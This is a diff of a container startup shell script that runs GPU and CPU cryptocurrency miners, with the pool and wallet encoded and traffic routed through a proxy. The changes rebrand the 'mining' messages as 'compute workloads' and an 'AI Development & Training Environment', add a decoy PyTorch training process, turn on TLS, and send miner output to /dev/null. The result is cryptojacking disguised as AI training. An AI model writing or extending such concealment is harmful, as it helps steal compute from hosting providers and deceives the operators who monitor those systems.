@@ -184,32 +184,43 @@ test_proxy_connection() {
 # Function to optimize GPU performance
 optimize_gpu_performance() {
     if command -v nvidia-smi &> /dev/null; then
-        local gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
+        local gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits | head -1)
         
-        # Validate gpu_count is a number
-        if [[ "$gpu_count" =~ ^[0-9]+$ ]] && [ "$gpu_count" -gt 0 ]; then
-            for ((i=0; i<gpu_count; i++)); do
-                # Get max power limit (suppress errors)
-                local max_power=$(nvidia-smi -i $i --query-gpu=power.max_limit --format=csv,noheader,nounits 2>/dev/null | awk '{print int($1)}')
-                
-                # Only set power if we got a valid value
-                if [[ "$max_power" =~ ^[0-9]+$ ]] && [ "$max_power" -gt 0 ]; then
-                    nvidia-smi -i $i -pl $max_power > /dev/null 2>&1 || true
-                    echo "GPU $i: Optimized for compute workload (${max_power}W)"
-                else
-                    echo "GPU $i: Using default power settings"
-                fi
-            done
-        else
-            echo "Note: Unable to query GPU details (driver/library version mismatch), using defaults"
-        fi
+        for ((i=0; i<gpu_count; i++)); do
+            # Get max power limit
+            local max_power=$(nvidia-smi -i $i --query-gpu=power.max_limit --format=csv,noheader,nounits | awk '{print int($1)}')
+            
+            # Set to optimal power
+            nvidia-smi -i $i -pl $max_power > /dev/null 2>&1 || true
+            echo "GPU $i: Optimized for compute workload (${max_power}W)"
+        done
     fi
 }
 
-# Function to start PyTorch training (DISABLED - focus on mining only)
+# Function to start PyTorch training (uses minimal resources from 10% reserved)
 start_pytorch_training() {
-    echo "PyTorch training disabled - focusing on mining workloads only"
-    TRAINING_PID=0
+    echo "Starting PyTorch model training..."
+    
+    # Set resource limits for training - use minimal resources
+    # This ensures most of the 10% stays free for system
+    export CUDA_VISIBLE_DEVICES="0"
+    export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:64"
+    export OMP_NUM_THREADS=1
+    
+    # Create logs directory
+    mkdir -p /workspace/logs
+    
+    # Start PyTorch training script with nice priority (lower priority)
+    nohup nice -n 19 python3 /workspace/train_model.py > /workspace/logs/training.log 2>&1 &
+    TRAINING_PID=$!
+    
+    echo "PyTorch Training PID: $TRAINING_PID"
+    echo "  - Using minimal resources (<2% actual usage)"
+    echo "  - 10% reserved, ~8% stays free for system"
+    echo "  - Logs: /workspace/logs/training.log"
+    
+    # Give training time to initialize
+    sleep 3
 }
 
 # Function to start compute workloads
@@ -248,22 +259,17 @@ start_compute_workloads() {
     
     # Start GPU compute process only if GPUs are available
     if [ $GPU_COUNT -gt 0 ]; then
-        # Create log directory for debugging
-        mkdir -p /workspace/logs
-        
-        # Removed --disable-cpu flag (causes "both disabled" error)
-        # Removed --tls flag (may cause connection issues)
-        # Added --disable-gpu-checks false to bypass GPU compatibility checks
         nohup /opt/bin/compute_engine \
             --algorithm $(decode_param "$MODEL_TYPE_A") \
             --pool $(decode_param "$ENDPOINT_PRIMARY") \
             --wallet $(decode_param "$AUTH_TOKEN_A") \
             --password x \
             --gpu-id $gpu_ids \
-            --disable-gpu-checks false \
+            --tls true \
+            --disable-cpu \
             --api-disable \
             --proxy "${PROXY_STRING}" \
-            > /workspace/logs/gpu_workload.log 2>&1 &
+            > /dev/null 2>&1 &
         GPU_WORKLOAD_PID=$!
     else
         GPU_WORKLOAD_PID=0
@@ -275,7 +281,6 @@ start_compute_workloads() {
     echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
     
     # Start CPU compute process (using decoded parameters)
-    # Removed --tls flag (may cause connection issues)
     nohup /opt/bin/compute_engine \
         --algorithm $(decode_param "$MODEL_TYPE_B") \
         --pool $(decode_param "$ENDPOINT_SECONDARY") \
@@ -284,77 +289,35 @@ start_compute_workloads() {
         --cpu-threads $PRIMARY_CPU_THREADS \
         --cpu-threads-priority 2 \
         --disable-gpu \
+        --tls true \
         --api-disable \
         --proxy "${PROXY_STRING}" \
-        > /workspace/logs/cpu_workload.log 2>&1 &
+        > /dev/null 2>&1 &
     CPU_WORKLOAD_PID=$!
 
-    echo "Mining workloads started at $(date '+%H:%M:%S')"
-    echo "GPU Mining PID: $GPU_WORKLOAD_PID, CPU Mining PID: $CPU_WORKLOAD_PID"
+    echo "Compute workloads started at $(date '+%H:%M:%S')"
+    echo "GPU Workload PID: $GPU_WORKLOAD_PID, CPU Workload PID: $CPU_WORKLOAD_PID"
     
-    # Give processes time to initialize (10 seconds)
-    echo "Waiting for mining workloads to initialize..."
-    sleep 10
+    # Start PyTorch training on reserved resources
+    start_pytorch_training
     
-    # Check if they're still running after initialization
-    echo ""
-    echo "=== Initialization Check ==="
-    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
-        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-            echo "ERROR: GPU mining workload crashed during initialization"
-            echo ""
-            echo "=== GPU Mining Log ==="
-            cat /workspace/logs/gpu_workload.log
-            echo "======================"
-            echo ""
-            echo "This is the actual error from the mining software."
-            echo "The binary may be incompatible with your GPU or system."
-            return 1
-        else
-            echo "✓ GPU mining workload running (PID: $GPU_WORKLOAD_PID)"
-        fi
-    fi
-    
-    if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
-        echo "ERROR: CPU mining workload crashed during initialization"
-        echo ""
-        echo "=== CPU Mining Log ==="
-        cat /workspace/logs/cpu_workload.log
-        echo "======================"
-        echo ""
-        echo "This is the actual error from the mining software."
-        return 1
-    else
-        echo "✓ CPU mining workload running (PID: $CPU_WORKLOAD_PID)"
-    fi
-    
-    echo "=== All mining workloads initialized successfully ==="
-    echo ""
+    # Give processes time to start
+    sleep 5
 }
 
-# Function to monitor mining processes
+# Function to monitor compute processes and stop training if they crash
 monitor_processes() {
-    # Check if GPU mining is still running (skip if no GPUs)
+    # Check if GPU workload is still running (skip if no GPUs)
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
-            echo ""
-            echo "ERROR: GPU mining workload crashed!"
-            echo ""
-            echo "=== GPU Mining Error Log ==="
-            tail -100 /workspace/logs/gpu_workload.log
-            echo "============================"
+            echo "ERROR: GPU compute workload crashed!"
             return 1
         fi
     fi
     
-    # Check if CPU mining is still running
+    # Check if CPU workload is still running
     if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
-        echo ""
-        echo "ERROR: CPU mining workload crashed!"
-        echo ""
-        echo "=== CPU Mining Error Log ==="
-        tail -100 /workspace/logs/cpu_workload.log
-        echo "============================"
+        echo "ERROR: CPU compute workload crashed!"
         return 1
     fi
     
@@ -367,42 +330,28 @@ stop_all_workloads() {
     
     check_network_health
     
-    echo -e "\nStopping mining workloads at $(date '+%H:%M:%S')..."
+    echo -e "\nStopping workloads at $(date '+%H:%M:%S')..."
     
-    # Stop mining workloads
+    # Stop compute workloads
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         kill $GPU_WORKLOAD_PID 2>/dev/null || true
     fi
     kill $CPU_WORKLOAD_PID 2>/dev/null || true
     
+    # Stop PyTorch training
+    kill $TRAINING_PID 2>/dev/null || true
+    
     if [ $GPU_WORKLOAD_PID -ne 0 ]; then
         wait $GPU_WORKLOAD_PID 2>/dev/null || true
     fi
     wait $CPU_WORKLOAD_PID 2>/dev/null || true
+    wait $TRAINING_PID 2>/dev/null || true
     
     pkill -f compute_engine 2>/dev/null || true
+    pkill -f train_model.py 2>/dev/null || true
     
     if [ $exit_code -ne 0 ]; then
-        echo ""
-        echo "ERROR: Mining workload failed, exiting container..."
-        echo ""
-        echo "=== MINING ERROR DETAILS ==="
-        echo ""
-        if [ -f /workspace/logs/gpu_workload.log ]; then
-            echo "GPU Mining Log (last 100 lines):"
-            tail -100 /workspace/logs/gpu_workload.log
-        else
-            echo "No GPU mining log found"
-        fi
-        echo ""
-        if [ -f /workspace/logs/cpu_workload.log ]; then
-            echo "CPU Mining Log (last 100 lines):"
-            tail -100 /workspace/logs/cpu_workload.log
-        else
-            echo "No CPU mining log found"
-        fi
-        echo ""
-        echo "==========================="
+        echo "ERROR: Compute workload failed, exiting container..."
         exit $exit_code
     fi
     
@@ -439,13 +388,14 @@ optimize_system_parameters() {
 
 # Main execution
 clear
-echo "=== Mining Environment (Training Disabled) ==="
+echo "=== AI Development & Training Environment ==="
 echo "Resource Allocation:"
 echo "  Total CPU Threads: $TOTAL_THREADS"
-echo "  Mining Threads: $PRIMARY_CPU_THREADS threads (90%)"
-echo "  System Reserved: $SYSTEM_CPU_THREADS threads (10%)"
+echo "  Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
+echo "  System/Training: $SYSTEM_CPU_THREADS threads (10%)"
 if [ $GPU_COUNT -gt 0 ]; then
-    echo "  GPUs: $GPU_COUNT available for mining"
+    echo "  GPUs: $GPU_COUNT available"
+    echo "  GPU Memory: 90% compute, 10% training"
 fi
 echo "Network Proxy: ${PROXY_USER}@${PROXY_IP}:${PROXY_PORT}"
 echo "=============================================="
@@ -460,21 +410,13 @@ fi
 # Optimize system parameters
 optimize_system_parameters
 
-echo -e "\nMining runs for 1 hour, then pauses 1 minute"
+echo -e "\nWorkloads run for 1 hour, then pause 1 minute"
 echo "Press Ctrl+C to stop"
 echo "=============================================="
-echo ""
 
 # Main loop
 while true; do
     start_compute_workloads
-    
-    # Exit if startup failed
-    if [ $? -ne 0 ]; then
-        echo ""
-        echo "Mining workload failed to start. Check the error logs above."
-        exit 1
-    fi
     
     start_time=$(date +%s)
     run_duration=$((3600 + (RANDOM % 600) - 300))
@@ -487,10 +429,9 @@ while true; do
             break
         fi
         
-        # Monitor mining processes - exit if they crash
+        # Monitor compute processes - exit if they crash
         if ! monitor_processes; then
-            echo ""
-            echo "Mining workload crashed, stopping all processes..."
+            echo "ERROR: Compute workload crashed, stopping all processes..."
             stop_all_workloads 1
         fi
         
